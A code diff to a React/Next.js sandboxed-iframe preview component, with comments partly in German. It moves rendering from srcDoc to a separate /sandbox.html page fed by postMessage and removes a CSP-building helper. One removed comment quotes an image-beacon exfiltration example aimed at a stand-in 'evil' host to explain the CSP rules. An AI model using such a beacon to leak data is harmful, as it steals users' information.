@@ -1,6 +1,6 @@
 "use client";
 
-import { useMemo } from "react";
+import { useEffect, useMemo, useRef } from "react";
 import type { Framework } from "@/lib/types";
 
 interface Props {
@@ -22,8 +22,14 @@ interface Props {
  * Security model:
  *  - sandbox="allow-scripts" WITHOUT allow-same-origin  → opaque origin:
  *    the code cannot read our DOM, cookies, localStorage or Appwrite session.
- *  - CSP inside the document blocks network exfiltration (connect-src 'none')
- *    and restricts which scripts may load.
+ *  - The sandbox document (/sandbox.html) ships its own CSP via next.config.ts
+ *    headers: connect-src 'none' blocks exfiltration, script-src erlaubt nur
+ *    selbst gehostete Vendor-Bundles (React/Babel/Tailwind/Vue) + Inline-Code.
+ *
+ * Warum src statt srcDoc: srcdoc-Dokumente ERBEN die CSP der Hauptseite —
+ * deren strenge script-src blockierte React/Babel/Tailwind komplett.
+ * Ein per src geladenes Dokument bekommt seine eigene (Pfad-)CSP.
+ * Der Code wird per postMessage übergeben, sobald die Sandbox "ready" meldet.
  */
 export default function SandboxPreview({
   framework,
@@ -35,15 +41,47 @@ export default function SandboxPreview({
   bg = "#0b0b12",
   fit = false,
 }: Props) {
-  const srcDoc = useMemo(
-    () => buildSrcDoc(framework, html, css, js, bg, fit),
+  const iframeRef = useRef<HTMLIFrameElement>(null);
+  const readyRef = useRef(false);
+
+  const payload = useMemo(
+    () => ({ type: "elementa:render", framework, html, css, js, bg, fit }),
     [framework, html, css, js, bg, fit],
   );
+  const payloadRef = useRef(payload);
+  payloadRef.current = payload;
+
+  // Handshake: Sandbox meldet "ready" (auch nach einem Reload), dann Code schicken.
+  // targetOrigin "*" ist hier korrekt: die Sandbox hat eine opaque origin und der
+  // Payload ist ohnehin öffentlicher Komponenten-Code.
+  useEffect(() => {
+    function onMessage(e: MessageEvent) {
+      const frame = iframeRef.current;
+      if (!frame || e.source !== frame.contentWindow) return;
+      if (e.data?.type === "elementa:ready") {
+        readyRef.current = true;
+        frame.contentWindow?.postMessage(payloadRef.current, "*");
+      }
+    }
+    window.addEventListener("message", onMessage);
+    // Falls die Sandbox schon geladen ist (Hydration NACH iframe-Load),
+    // ging ihr erstes "ready" verloren — direkt einmal proaktiv senden.
+    iframeRef.current?.contentWindow?.postMessage(payloadRef.current, "*");
+    return () => window.removeEventListener("message", onMessage);
+  }, []);
+
+  // Live-Update bei Prop-Änderungen (z. B. Hintergrund-Toggle, Editor).
+  useEffect(() => {
+    if (readyRef.current) {
+      iframeRef.current?.contentWindow?.postMessage(payload, "*");
+    }
+  }, [payload]);
 
   return (
     <iframe
+      ref={iframeRef}
       title="Vorschau"
-      srcDoc={srcDoc}
+      src="/sandbox.html"
       sandbox="allow-scripts"
       referrerPolicy="no-referrer"
       loading="lazy"
@@ -51,106 +89,4 @@ export default function SandboxPreview({
       style={{ width: "100%", height, border: 0, background: "transparent", display: "block" }}
     />
   );
-}
-
-// Skaliert den Inhalt so herunter, dass er komplett in den iframe passt (kein Clipping).
-// Läuft IM iframe (kennt daher window.innerHeight) — misst die natürliche Größe und
-// wendet eine transform:scale an. Mehrfach getriggert für async gerenderte Inhalte.
-const FIT_SCRIPT = `<script>(function(){
-  var el=document.getElementById('__fit'); if(!el) return;
-  function f(){
-    el.style.transform='none';
-    var r=el.getBoundingClientRect(), pad=8;
-    var s=Math.min(1,(window.innerWidth-pad)/r.width,(window.innerHeight-pad)/r.height);
-    if(s>0 && s<1) el.style.transform='scale('+s+')';
-  }
-  requestAnimationFrame(f); setTimeout(f,120); setTimeout(f,450);
-  window.addEventListener('load',f);
-  if(window.ResizeObserver){ try{ new ResizeObserver(f).observe(el); }catch(e){} }
-})();<\/script>`;
-
-function buildSrcDoc(framework: Framework, html: string, css: string, js: string, bg: string, fit = false): string {
-  // Vue/Svelte brauchen einen Compile-Schritt — bis dahin ein sauberer Platzhalter
-  // statt roher, kaputt gerenderter Quelltext.
-  if (framework === "vue" || framework === "svelte") {
-    const label = framework === "vue" ? "Vue" : "Svelte";
-    return `<!doctype html><html><head><meta charset="utf-8">
-<style>html,body{margin:0;height:100%}body{display:grid;place-items:center;background:${bg};color:#a6a29a;font-family:system-ui,sans-serif;text-align:center;padding:24px;box-sizing:border-box}</style>
-</head><body><div><div style="font-size:15px;font-weight:600;color:#a78bfa;margin-bottom:8px">${label}</div>
-<div style="font-size:13px;line-height:1.5">Live-Vorschau für ${label} folgt in Kürze.<br>Der Code unten ist voll nutzbar &amp; kopierbar.</div></div></body></html>`;
-  }
-
-  const isReact = framework === "react";
-  const isTailwind = framework === "tailwind";
-
-  const scriptSrc = [
-    "'unsafe-inline'",
-    // Tailwind Play-CDN UND React/Babel-standalone kompilieren zur Laufzeit → brauchen 'unsafe-eval'.
-    isReact || isTailwind ? "'unsafe-eval'" : "",
-    isReact ? "https://cdn.jsdelivr.net" : "",
-    isTailwind ? "https://cdn.tailwindcss.com" : "",
-  ]
-    .filter(Boolean)
-    .join(" ");
-
-  const csp = [
-    "default-src 'none'",
-    // Kein blankes https: bei img/font/style -> verhindert Daten-Exfiltration
-    // per Bild-Beacon (new Image().src = "https://evil/?"+data) aus fremdem Code.
-    "style-src 'unsafe-inline'",
-    "img-src data:",
-    "font-src data:",
-    `script-src ${scriptSrc}`,
-    "connect-src 'none'",
-    "base-uri 'none'",
-    "form-action 'none'",
-  ].join("; ");
-
-  const head = `<meta charset="utf-8">
-<meta http-equiv="Content-Security-Policy" content="${csp}">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-${isTailwind ? '<script src="https://cdn.tailwindcss.com"></script>' : ""}
-${
-  isReact
-    ? `<script src="https://cdn.jsdelivr.net/npm/react@18.3.1/umd/react.production.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/react-dom@18.3.1/umd/react-dom.production.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7/babel.min.js"></script>`
-    : ""
-}
-<style>
-  html,body{margin:0;height:100%}
-  body{display:grid;place-items:center;padding:${fit ? 8 : 24}px;box-sizing:border-box;
-       ${fit ? "overflow:hidden;" : ""}background:${bg};color:#fff;font-family:system-ui,sans-serif}
-  #__fit{transform-origin:center center}
-  ${css}
-</style>`;
-
-  if (isReact) {
-    const name = detectComponentName(html);
-    return `<!doctype html><html><head>${head}</head><body>
-${fit ? '<div id="__fit"><div id="root"></div></div>' : '<div id="root"></div>'}
-<script type="text/babel" data-presets="react">
-${html}
-try{ReactDOM.createRoot(document.getElementById('root')).render(<${name} />);}catch(e){document.getElementById('root').textContent=String(e);}
-</script>
-${fit ? FIT_SCRIPT : ""}
-</body></html>`;
-  }
-
-  return `<!doctype html><html><head>${head}</head><body>
-${fit ? `<div id="__fit">${html}</div>` : html}
-${js ? `<script>${js}<\/script>` : ""}
-${fit ? FIT_SCRIPT : ""}
-</body></html>`;
-}
-
-function detectComponentName(code: string): string {
-  const def = code.match(/export\s+default\s+function\s+([A-Z][A-Za-z0-9_]*)/);
-  if (def) return def[1];
-  // letzte deklarierte PascalCase-Komponente (Helfer stehen meist davor)
-  const fns = [...code.matchAll(/function\s+([A-Z][A-Za-z0-9_]*)/g)];
-  if (fns.length) return fns[fns.length - 1][1];
-  const cns = [...code.matchAll(/const\s+([A-Z][A-Za-z0-9_]*)\s*=/g)];
-  if (cns.length) return cns[cns.length - 1][1];
-  return "App";
 }
